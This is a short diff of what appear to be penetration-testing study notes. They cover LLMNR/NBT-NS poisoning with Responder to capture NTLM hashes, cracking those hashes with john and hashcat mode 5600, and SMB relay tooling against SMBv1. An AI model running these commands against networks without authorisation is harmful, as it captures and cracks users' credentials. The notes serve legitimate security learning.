@@ -1,11 +1,11 @@
 #LLMNR Posioning - (LLMNR/NBTNS/MDNS) -capture hashes and crack  (Responder)(john,hashcat) --As much you want (domain) 
-#SMB Relay - NTLM crack(account access), smb share folder(files access), smb shares access(system access) (Responder,smbrelayx,crackmapsec-ntlmralyx)(john,hashcat)(smbclient,smbmap)(nc)
+
 
 responder -I eth0
 john --wordlist=wordlist.txt hash.txt
 hashcat –m 5600 hash.txt wordlist.txt
 
-
+#SMB Relay - NTLM crack(account access), smb share folder(files access), smb shares access(system access) (Responder,smbrelayx,crackmapsec-ntlmralyx)(john,hashcat)(smbclient,smbmap)(nc)
 SMB Relay - Vulnerbality 
 SMBv1, SMBv1.1 
 
